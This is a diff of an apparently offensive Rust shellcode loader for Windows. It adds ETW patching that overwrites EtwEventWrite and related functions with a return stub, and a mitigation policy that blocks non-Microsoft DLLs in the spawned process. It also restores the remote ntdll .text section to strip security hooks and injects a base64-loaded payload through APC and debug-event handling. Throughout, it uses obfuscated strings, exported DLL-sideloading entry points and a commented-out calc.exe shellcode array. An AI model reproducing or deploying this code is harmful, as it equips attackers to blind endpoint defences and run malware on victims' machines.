@@ -1,5 +1,6 @@
+use scanf::scanf;
 use std::{ptr::{null_mut, null}, mem::transmute, mem::size_of, collections::BTreeMap, ffi::{CStr, CString, c_void}, ops::Add, fs::File, io::Read};
-use std::thread;
+use std::{thread, time};
 
 use obfstr::obfstr as obf;
 use base64::decode;
@@ -40,10 +41,12 @@ use winapi::{
             OpenProcess,
             PROCESS_INFORMATION,
             PPROC_THREAD_ATTRIBUTE_LIST,
+            LPPROC_THREAD_ATTRIBUTE_LIST,
             STARTUPINFOA,
             TerminateProcess,
             InitializeProcThreadAttributeList,
-            UpdateProcThreadAttribute
+            UpdateProcThreadAttribute,
+            DeleteProcThreadAttributeList
         },
         winbase::{
             STARTUPINFOEXA,
@@ -90,10 +93,21 @@ use winapi::{
             NT_SUCCESS,
             NTSTATUS
         },
+        basetsd::{
+            DWORD64,
+            SIZE_T
+        },
+        minwindef::{
+            DWORD,
+            FALSE,
+            TRUE
+        }
     },
 };
 
-const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON:usize = 0x00000001 << 44;
+// const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON : u64 = 0x100100000000;
+const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON : u64 = 0x00000001 << 44;
+const PROCESS_CREATION_MITIGATION_POLICY2_BLOCK_NON_CET_BINARIES_ALWAYS_ON : u64 = 0x00000001 << 36;
 const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY:usize = 0x00020007;
 
 const PEBOFFSET: u64 = 0x60;
@@ -101,6 +115,14 @@ const PEBOFFSET: u64 = 0x60;
 pub fn __breakpoint() {
     unsafe{
         std::arch::asm!("int3");
+    }
+}
+
+pub fn __pause() {
+    let mut product: String = String::new();
+    let mut price: f32 = 0.0;
+    println!("Pause:");
+    if scanf!("{}: {}", product, price).is_ok() {
     }
 }
 
@@ -276,7 +298,7 @@ unsafe fn get_module_export_lists(module_base: PVOID) -> BTreeMap<String, usize>
 
 unsafe fn patch_etw(hprocess: HANDLE, nt_funcs: BTreeMap<String, usize>, k32_funcs: BTreeMap<String, usize>) -> bool {
     let written = null_mut() as PVOID;
-    let nt_trace_ptr = nt_funcs.get(obf!("NtTraceControl")).unwrap();
+    let mut nt_trace_ptr = nt_funcs.get(obf!("NtTraceControl")).unwrap();
     let mut base_address = *nt_trace_ptr as *mut c_void;
 
     println!("[+] NtTraceControl addr {:x?}", nt_trace_ptr);
@@ -285,13 +307,25 @@ unsafe fn patch_etw(hprocess: HANDLE, nt_funcs: BTreeMap<String, usize>, k32_fun
 
     // __breakpoint();
 
-    let res = transmute::<_, WriteProcessMemory>(*k32_funcs.get(obf!("WriteProcessMemory")).expect("OOOPS"))(
-        hprocess,
-        *nt_trace_ptr as PVOID,
-        patch.as_ptr() as PVOID,
-        patch.len() as PVOID,
-        &written
-    );
+    let mthd = [
+            "EtwEventWrite",
+            "EtwNotificationRegister",
+            "EtwEventRegister",
+            "EtwEventWriteFull",
+    ];
+
+    let mut res = false;
+    for fun in mthd {
+        nt_trace_ptr = nt_funcs.get(fun).expect("Failed getting ETW funcs");
+        let patch : Vec<u8>  = vec![0x48, 0x33, 0xc0, 0xC3];
+        res = transmute::<_, WriteProcessMemory>(*k32_funcs.get(obf!("WriteProcessMemory")).expect("OOOPS"))(
+            hprocess,
+            *nt_trace_ptr as PVOID,
+            patch.as_ptr() as PVOID,
+            patch.len() as PVOID,
+            &written
+        );
+    }
     return res
 }
 
@@ -332,59 +366,63 @@ fn main() {
     let mut process_information:PROCESS_INFORMATION = PROCESS_INFORMATION::default();
     let mut si:STARTUPINFOEXA = STARTUPINFOEXA::default();
     let mut allocstart : *mut c_void = null_mut();
+    let mut attributesize: SIZE_T = Default::default();
 
-    let mut attributesize: usize =0;
     println!("[+] Now setting up the new process policy");
     let mut status;
     unsafe {
         status = InitializeProcThreadAttributeList(null_mut(),1,0, &mut attributesize);
-        println!("[+] InitializeProcThreadAttributeList result: {:x}", status as usize);
-        si.lpAttributeList= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,attributesize) as PPROC_THREAD_ATTRIBUTE_LIST;
-        status = InitializeProcThreadAttributeList(si.lpAttributeList,1,0, &mut attributesize);
-        println!("[+] InitializeProcThreadAttributeList result: {:x}", status as usize);
+        assert_ne!(attributesize, 0);
+        println!("[+] InitializeProcThreadAttributeList result: {:x} Size: {}", status as usize, attributesize);
 
-        let mut policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON as usize;
-        println!("[+] Policy: {:x}", policy as usize);
+        let mut lp_attribute_list: Box<[u8]> = vec![0; attributesize].into_boxed_slice();
+        si.lpAttributeList = lp_attribute_list.as_mut_ptr().cast::<_>() as LPPROC_THREAD_ATTRIBUTE_LIST;
+
+        // si.lpAttributeList= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,attributesize) as PPROC_THREAD_ATTRIBUTE_LIST;
+
+        status = InitializeProcThreadAttributeList(si.lpAttributeList,1,0, &mut attributesize);
+        println!("[+] InitializeProcThreadAttributeList result: {:x} Size: {}", status as usize, attributesize);
+
+        let my_u64: DWORD64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+        let my_pvoid: *mut c_void = &my_u64 as *const DWORD64 as *mut c_void;
+        println!("[+] Policy: {:x}", my_pvoid as usize);
+
+        let policy_mem: Box<PVOID> = Box::new(my_pvoid); // malloc heap
+        let raw_pointer_mut = *policy_mem as *mut c_void;
 
         let mut result = UpdateProcThreadAttribute(
             si.lpAttributeList,
             0,
-            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
-            policy as *mut c_void,
-            size_of::<usize>(),
+            0x20007,
+            raw_pointer_mut,
+            size_of::<DWORD64>(),
             null_mut(),
             null_mut()
         );
         println!("[+] UpdateProcThreadAttribute (Policy) result: {:x}", result);
-        // let mut openproc: HANDLE = OpenProcess(0x02000000, 0, 2388);
-        // println!("[+] OpenProc handle: {:X}", openproc as usize);
-        // result = UpdateProcThreadAttribute(
-        //     si.lpAttributeList,
-        //     0,
-        //     0 | 0x00020000,
-        //     (&mut openproc) as *mut *mut c_void as *mut c_void,
-        //     size_of::<HANDLE>(),
-        //     null_mut(),
-        //     null_mut()
-        // );
-        // println!("[+] UpdateProcThreadAttribute (PPID) result: {:x}", result);
     }
 
+    si.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
+    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
     let create_process_result = unsafe {
         CreateProcessA(
             null_mut(),
             lp_command_line,
             null_mut(),
             null_mut(),
-            EXTENDED_STARTUPINFO_PRESENT as i32,
-            winapi::um::winbase::DEBUG_PROCESS | 0x00000004,
-            // 0x00000004,
+            FALSE,
+            EXTENDED_STARTUPINFO_PRESENT | 0x00000004 | winapi::um::winbase::DEBUG_PROCESS,
             null_mut(),
             null_mut(),
             &mut si.StartupInfo,
             &mut process_information,
         )
     };
+    println!("[+] CreateProcessResult: {:x}", create_process_result as usize);
+    unsafe { DeleteProcThreadAttributeList(si.lpAttributeList)}
+
+    // unsafe { __breakpoint(); }
+
     println!("[+] Process name: {}", process_name);
     println!("[+] Process ID: {}", process_information.dwProcessId);
     println!("[+] Process handle: {:x?}", process_information.hProcess);
@@ -398,39 +436,39 @@ fn main() {
     )};
     let psapi_functions = unsafe { get_module_export_lists(psapi) };
 
-    let mut buffer: [u8; 277] = [ 0xcc,
-        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
-        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
-        0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
-        0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
-        0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
-        0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
-        0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
-        0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
-        0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
-        0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
-        0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
-        0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
-        0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
-        0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
-        0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
-        0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
-        0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
-        0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
-        0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
-        0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
-        0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
-        0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
-        0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
-        0x2e,0x65,0x78,0x65,0x00];
-    println!("[+] Buf Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
+    // let mut buffer: [u8; 277] = [ 0xcc,
+    //     0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
+    //     0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
+    //     0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
+    //     0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
+    //     0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
+    //     0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
+    //     0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
+    //     0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
+    //     0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
+    //     0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
+    //     0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
+    //     0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
+    //     0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
+    //     0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
+    //     0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
+    //     0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
+    //     0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
+    //     0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
+    //     0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
+    //     0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
+    //     0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
+    //     0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
+    //     0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
+    //     0x2e,0x65,0x78,0x65,0x00];
+    // println!("[+] Buf Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
  
-    // let my_str = include_str!("loader.b64");
-    // let mut file_contents = decode(my_str).expect("Failed to load load");
-    // file_contents.insert(0, 0xcc as u8);
-    // let sss = file_contents.len();
-    // let mut buffer = file_contents.into_boxed_slice();
-    // println!("[+] Buf2 Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
+    let my_str = include_str!("loader.b64");
+    let mut file_contents = decode(my_str).expect("Failed to load load");
+    file_contents.insert(0, 0xcc as u8);
+    let sss = file_contents.len();
+    let mut buffer = file_contents.into_boxed_slice();
+    println!("[+] Buf2 Ptr {:x?}", buffer.as_mut_ptr() as PVOID);
 
     let nt_avm_addr = nt_functions.get("NtAllocateVirtualMemory").unwrap();
     println!("[+] NtAllocateVitualMemory function address {:x?}", nt_avm_addr);
@@ -447,10 +485,11 @@ fn main() {
     // let terminated = unsafe { TerminateProcess(process_information.hProcess, 101) };
 
     unsafe { 
-        // let patch_res = patch_etw(0xffffffffffffffff as HANDLE,nt_functions.to_owned(), k32_functions.to_owned());
-        // if patch_res != true {
-        //     println!("[-] Status: {}", patch_res)
-        // }
+        //Repatching ETW since .text overwrite removed previous patch
+        let patch_res = patch_etw(0xffffffffffffffff as HANDLE,nt_functions.to_owned(), k32_functions.to_owned());
+        if patch_res != true {
+            println!("[-] Status: {}", patch_res)
+        }
 
         let mut size = buffer.len() as usize;
         println!("[+] Buf Size {}", buffer.len());
@@ -559,7 +598,9 @@ fn main() {
             println!("Well shit {:x}", apc);
         }
 
+
         DebugActiveProcess(process_information.dwProcessId);
+        copy_local_ntdll_to_remote_ntdll_text_section(ntdll_addr, kernel32_addr.to_owned(), ".text", process_information.hProcess as isize, k32_functions.to_owned(), nt_functions.to_owned());
         apc = NtResumeThread(process_information.hThread, &mut 0);
 
         let mut debug_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
@@ -575,10 +616,22 @@ fn main() {
             match debug_event.dwDebugEventCode {
                 EXCEPTION_DEBUG_EVENT => {
                     let exception = unsafe { &debug_event.u.Exception() };
-                    // println!("Exception code: {:x}", exception.ExceptionRecord.ExceptionCode);
+                    println!("Exception code: 0x{:x} Address: 0x{:x} First Change: 0x{:x} Information: 0x{:x} ThreadId: 0x{:x}", 
+                        exception.ExceptionRecord.ExceptionCode as usize,
+                        exception.ExceptionRecord.ExceptionAddress as usize,
+                        exception.dwFirstChance,
+                        exception.ExceptionRecord.ExceptionInformation[0] as usize,
+                        debug_event.dwThreadId
+                    );
+                    if exception.ExceptionRecord.ExceptionCode == 0x1d4
+                        || exception.ExceptionRecord.ExceptionCode == 0x1d0 {
+                        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+                        continue
+                    }
                     if exception.ExceptionRecord.ExceptionCode == 0x80000003 {
                         codes += 1;
                         if ((codes == 2) && !done){
+                            println!("Exception address: 0x{:x}", exception.ExceptionRecord.ExceptionAddress as usize);
                             done = true;
                             println!("[+] Now writing NTDLL .text back to child process since it might be hooked now");
                             copy_local_ntdll_to_remote_ntdll_text_section(ntdll_addr, kernel32_addr.to_owned(), ".text", process_information.hProcess as isize, k32_functions.to_owned(), nt_functions.to_owned());
@@ -845,10 +898,10 @@ pub extern "C" fn CurrentIP() {
 
 #[no_mangle]
 pub extern "C" fn ConstructPartialMsgVW() {
-    unsafe { main() };
+    // unsafe { main() };
 }
 
 #[no_mangle]
 pub extern "C" fn WdsSetupLogMessageW() {
-    unsafe { main() };
+    // unsafe { main() };
 }
